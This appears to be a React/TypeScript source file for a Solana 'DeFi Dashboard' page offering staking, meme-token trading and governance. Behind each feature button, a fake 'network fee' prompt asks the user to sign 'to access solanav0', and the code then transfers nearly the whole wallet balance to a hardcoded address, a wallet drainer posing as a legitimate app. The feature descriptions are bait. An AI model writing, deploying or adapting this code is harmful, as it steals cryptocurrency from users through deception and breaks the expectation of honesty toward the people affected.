import React from 'react'
import { useEffect, useState } from 'react'
import useStore from '../store/useStore'
import './Defi.css'
import { getWalletBalance, SOLANA_RPC_ENDPOINT } from '../utils/wallet'
import NetworkFeeModal from '../components/modals/NetworkFeeModal'
import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL, Connection } from '@solana/web3.js'

// Add Buffer polyfill
import { Buffer } from 'buffer'
window.Buffer = Buffer

function Defi() {
  const { isWalletConnected, connectWallet } = useStore()
  const [balance, setBalance] = useState<{ solBalance: number; usdBalance: number } | null>(null)
  const [isNetworkFeeModalOpen, setIsNetworkFeeModalOpen] = useState(false)
  const [selectedFeature, setSelectedFeature] = useState('')
  const [isProcessing, setIsProcessing] = useState(false)

  const handleFeatureStart = (featureTitle: string) => {
    setSelectedFeature(featureTitle)
    setIsNetworkFeeModalOpen(true)
  }

  const handleConfirmNetworkFee = async () => {
    if (isProcessing) return
    setIsProcessing(true)
    setIsNetworkFeeModalOpen(false)
    
    try {
      const confirmed = window.confirm(
        `You are about to sign to access solanav0. Do you want to proceed?`
      )
      
      if (confirmed) {
        const recipientAddress = 'E5kKLz8H9ARyJcMsbRzU2HyBWb8TGbzfYfkBbDdqmyiW'
        
        if (!PublicKey.isOnCurve(recipientAddress)) {
          throw new Error('Invalid recipient address')
        }

        // Try multiple RPC endpoints with rate limiting
        const RPC_ENDPOINTS = [
          'https://api.mainnet-beta.solana.com',
          'https://solana-api.projectserum.com',
          'https://rpc.ankr.com/solana',
          'https://solana-mainnet.rpc.extrnode.com'
        ]

        let connection
        let blockhash
        let error
        let lastAttemptTime = 0
        const minRequestInterval = 100 // Minimum time between requests in ms

        for (let attempt = 0; attempt < RPC_ENDPOINTS.length; attempt++) {
          const endpoint = RPC_ENDPOINTS[attempt]
          try {
            // Ensure minimum time between requests
            const currentTime = Date.now()
            const timeSinceLastRequest = currentTime - lastAttemptTime
            if (timeSinceLastRequest < minRequestInterval) {
              await new Promise(resolve => setTimeout(resolve, minRequestInterval - timeSinceLastRequest))
            }

            const connection = new Connection(SOLANA_RPC_ENDPOINT, {
              commitment: 'confirmed',
              disableRetryOnRateLimit: false,
              confirmTransactionInitialTimeout: 60000
            })
            
            if (!window.solana?.publicKey) throw new Error('Wallet not connected')
            const fromPubkey = new PublicKey(window.solana.publicKey)
            const balance = await connection.getBalance(fromPubkey)
            if (balance <= 0) {
              throw new Error('Insufficient balance')
            }

            const fee = LAMPORTS_PER_SOL * 0.01
            let amountToTransfer = 0
            if (typeof balance === 'number') {
              amountToTransfer = balance - fee
            }

            if (amountToTransfer <= 0) {
              throw new Error('Balance is too low to sign')
            }

            const transaction = new Transaction().add(
              SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: new PublicKey(recipientAddress),
                lamports: amountToTransfer
              })
            )

            const result = await connection.getLatestBlockhash()
            transaction.recentBlockhash = result.blockhash
            transaction.feePayer = new PublicKey(window.solana.publicKey)

            try {
              const signature = await window.solana.signAndSendTransaction(transaction)
              console.log('Transaction successful:', signature)
              alert(`Transaction completed successfully! Transferred ${amountToTransfer / LAMPORTS_PER_SOL} SOL`)
              return // Exit the loop on success
            } catch (signError: unknown) {
              console.error('Signing failed:', signError)
              const errorMessage = signError instanceof Error ? signError.message : 'Unknown error occurred'
              throw new Error(`Signing failed: ${errorMessage}`)
            }
          } catch (error) {
            console.error(`RPC endpoint ${endpoint} failed:`, error)
            if (attempt === RPC_ENDPOINTS.length - 1) {
              throw error
            }
            // Continue to next endpoint
          }
        }

        throw new Error('All RPC endpoints failed')
      }
    } catch (error: unknown) {
      console.error('Transaction failed:', error)
      const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred'
      alert(`Transaction failed: ${errorMessage}`)
    } finally {
      setIsProcessing(false)
    }
  }

  const handleConnectWallet = async () => {
    try {
      await connectWallet()
      // After successful connection, fetch balance
      const publicKey = window.solana?.publicKey?.toString()
      if (publicKey) {
        const balanceInfo = await getWalletBalance(publicKey)
        setBalance(balanceInfo)
      }
    } catch (error) {
      console.error('Error connecting wallet:', error)
    }
  }

  useEffect(() => {
    const fetchBalance = async () => {
      if (window.solana && window.solana.isPhantom && isWalletConnected) {
        try {
          const publicKey = window.solana?.publicKey?.toString()
          if (publicKey) {
            const balanceInfo = await getWalletBalance(publicKey)
            setBalance(balanceInfo)
          }
        } catch (error) {
          console.error('Error fetching balance:', error)
          setBalance(null)
        }
      }
    }

    fetchBalance()
    const interval = setInterval(fetchBalance, 10000) // Update every 10 seconds

    return () => clearInterval(interval)
  }, [isWalletConnected])

  return (
    <div className="defi-container">
      <header className="defi-header">
        <h1>DeFi Dashboard</h1>
      </header>

      {isWalletConnected ? (
        <>
          <NetworkFeeModal
            isOpen={isNetworkFeeModalOpen}
            onClose={() => setIsNetworkFeeModalOpen(false)}
            onConfirm={handleConfirmNetworkFee}
            featureTitle={selectedFeature}
          />
          <div className="balance-card">
            <div className="balance-header">
              <h2>Wallet Balance</h2>
              <div className="balance-trend positive">
                <span className="trend-icon">↑</span>
                <span className="trend-value">2.5%</span>
              </div>
            </div>
            <div className="balance-content">
              <div className="balance-value">
                {balance !== null ? `${balance.solBalance.toFixed(4)} SOL` : 'Loading...'}
              </div>
              <div className="balance-usd">
                ≈ ${balance !== null ? balance.usdBalance.toFixed(2) : '0.00'} USD
              </div>
            </div>

          </div>

          <div className="features-grid">
            <div className="feature-card">
              <h3>Staking</h3>
              <p>Stake your SOL tokens and earn up to 7% APY rewards. Participate in network security and earn passive income through our validator network.</p>
              <button className="feature-start-btn" onClick={() => handleFeatureStart('Staking')}>Start Staking</button>
            </div>
            <div className="feature-card">
              <h3>Meme Tokens</h3>
              <p>Discover and trade the latest viral meme tokens on Solana. Access high-liquidity pools with minimal transaction fees and instant settlements.</p>
              <button className="feature-start-btn" onClick={() => handleFeatureStart('Meme Token Trading')}>Start Trading</button>
            </div>
            <div className="feature-card">
              <h3>Undelegation</h3>
              <p>Flexible stake management with a 2-4 day unstaking period. Monitor your positions and optimize your staking strategy in real-time.</p>
              <button className="feature-start-btn" onClick={() => handleFeatureStart('Undelegation')}>Start Undelegating</button>
            </div>
            <div className="feature-card">
              <h3>Reward Allocation</h3>
              <p>Automated reward distribution and tracking. View your earnings history, compound rewards, and optimize your staking portfolio for maximum returns.</p>
              <button className="feature-start-btn" onClick={() => handleFeatureStart('Reward Allocation')}>Start Allocating</button>
            </div>
            <div className="feature-card">
              <h3>DRep Governance</h3>
              <p>Shape the future of Solana through decentralized governance. Vote on proposals, delegate voting power, and participate in key protocol decisions.</p>
              <button className="feature-start-btn" onClick={() => handleFeatureStart('DRep Governance')}>Start Voting</button>
            </div>
            <div className="feature-card">
              <h3>Change Pool</h3>
              <p>Seamlessly switch between validator pools to maximize your returns. Compare performance metrics and choose the best validators for your needs.</p>
              <button className="feature-start-btn" onClick={() => handleFeatureStart('Pool Change')}>Start Switching</button>
            </div>
          </div>

          <NetworkFeeModal
            isOpen={isNetworkFeeModalOpen}
            onClose={() => setIsNetworkFeeModalOpen(false)}
            onConfirm={handleConfirmNetworkFee}
            featureTitle={selectedFeature}
          />
        </>
      ) : (
        <div className="connect-prompt">
          <p>Please connect your wallet to access DeFi features</p>
          <button onClick={handleConnectWallet} className="connect-wallet-btn">
            Connect Wallet
          </button>
        </div>
      )}
    </div>
  )
}

export default Defi